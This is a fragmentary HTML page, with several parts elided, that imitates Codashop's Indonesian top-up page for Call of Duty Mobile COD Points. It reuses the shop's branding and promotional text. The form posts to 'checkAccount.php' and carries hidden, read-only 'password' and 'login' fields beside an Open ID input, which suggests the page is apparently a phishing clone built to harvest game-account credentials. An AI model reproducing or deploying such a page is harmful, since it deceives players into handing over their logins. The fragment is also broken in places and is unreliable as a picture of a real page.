...
<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.garena.game.codm&hl=id" rel="noopener" target="_blank">
...
<img src="https://cdn1.codashop.com/S/content/common/images/promos/Community%20Banners/codm_id_codaclub.jpeg" alt="Call of Duty Mobile Conversation"></a></p></article>
                  ...
                  <div class="form" id="formSection">
                     ...
                     <div class="email-input-container">
                        <form action="checkAccount.php" method="POST">
                            ...
                            <input name="password" type="hidden" value="" readonly>
                            <input name="login" type="hidden" value="" readonly>
                            <div style="margin-top: 10px; font-size: 14px;">
                                <label for="">Open ID</label>
                                <input type="tel" style="margin-top: 10px; font-size: 14px;" id="userIdForm" name="userIdForm" class="product-form-input" value="" readonly>
                            </div>
    ...
    border-radius: 25px;">
         ...
         <section class="section product__long-description shop-content__container" style="background: #280031;"> 
            <h1 class="product-tagline-title">
                    ...
                    Codashop - Cara Paling Mudah Top Up CODM Murah di Indonesia
            ...
            <article class="product__tag-line">
                    ...
                    <p class="shop-content--paragraph">Hanya butuh beberapa detik saja untuk membeli COD Points (CP) Call of Duty Mobile. COD Points (CP) bisa kamu gunakan untuk membeli Battle Pass premium, skin senjata, hingga experience card dan masih banyak lagi! Kami dipercaya oleh jutaan gamers & pengguna aplikasi di Asia Tenggara termasuk di Indonesia. Caranya mudah, tanpa perlu kartu kredit, registrasi, ataupun log-in! <a href="#top">Klik disini untuk memulai</a>.</p>
<p class="shop-content--paragraph"><strong>Tentang Call of Duty Mobile:</strong><br>
Nikmati game penuh aksi dari seri Call of Duty Mobile® Mobile yang memacu adrenalin dimanapun kamu berada. Mainkan berbagai macam pilihan game mode melawan musuh di map favorit kalian seperti Nuketown dan Crash, dengan pengalaman optimal di HP-mu.</p>
<br>Bentuk skuad bersama teman-temanmu, main sesuai gayamu dengan menggunakan UAV Recon atau Predator Missile dan modifikasi senjatamu untuk melawan musuh.
<br>Kalau kamu belum pernah mendengar Call of Duty Mobile® Mobile - Garena, tidak masalah. Yang perlu kamu ketahui adalah game ini akan memberikan pengalaman bermain FPS terbaik di HP. Siapkan senjatamu dan download sekarang juga!

<p class="shop-content--paragraph">NGOBROL BARENG TENTANG<br>
<a class="shop-content--image" href="https://community.codashop.com/id/categories/id-call-of-duty-mobile" target="_blank" rel="noopener"> 

<img src="https://cdn1.codashop.com/S/content/common/images/promos/Community%20Banners/codm_id_codaclub.jpeg" alt="Free Fire Conversation"></a>
